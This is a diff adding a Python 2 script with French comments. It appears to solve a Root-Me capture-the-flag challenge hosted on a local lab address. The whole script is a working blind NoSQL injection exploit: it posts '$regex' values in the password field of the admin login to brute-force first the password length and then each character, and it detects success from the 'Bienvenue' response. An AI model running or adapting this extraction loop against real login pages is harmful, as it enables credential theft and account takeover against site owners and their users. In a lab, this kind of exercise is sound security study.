@@ -1,0 +1,54 @@
+# !/usr/bin/env python2
+# -*- coding: utf8 -*-
+ 
+"""script de base emprunté à Geluchat via son blog https://www.dailysecurity.fr/nosql-injections-classique-blind/ """
+ 
+import requests
+ 
+page = "http://dev.root-me.local/index.php?page=login.php"
+ 
+size = 0
+while 1:
+    forge = ".{" + str(size) + "}"
+    req = {'usr_name': 'admin', 'usr_password[$regex]': forge}
+    resultat = requests.post(page, data=req).content
+    print(req)
+    if resultat.find(b'Bienvenue') == -1:
+        break
+    size += 1
+ 
+size -= 1
+print("Password size :" + str(size))
+ 
+passwd = ""
+char = 20
+length = 0
+nb_protect = 0
+# special regexp chars needs to be protected by an \
+special_chars_list = ['*', '+', '-', '/', '.', '?', ':', ';', '<', '=', '>', '\\', '^', '$', '&', ')', '(', ']', '[',
+                      '|', '!', ',', '-']
+while length != size:
+    if (str(chr(char))) in special_chars_list:
+        forge = passwd + '\\' + str(chr(char)) + '.{' + str(size - len(passwd) + nb_protect - 1) + '}'
+        protected = True
+    else:
+        forge = passwd + str(chr(char)) + '.{' + str(size - len(passwd) + nb_protect - 1) + '}'
+        protected = False
+    print(forge)
+    req = {'usr_name': 'admin', 'usr_password[$regex]': forge}
+    resultat = requests.post(page, data=req).content
+    print(req)
+    if resultat.find(b'Bienvenue') != -1:
+        if protected:
+            passwd += '\\' + str(chr(char))  # add a \
+            nb_protect += 1
+        else:
+            passwd += str(chr(char))
+        length += 1
+        char = 32
+        print(passwd)
+    if char == 127:
+        char = 45
+    char += 1
+ 
+print("Password result: " + str(passwd))
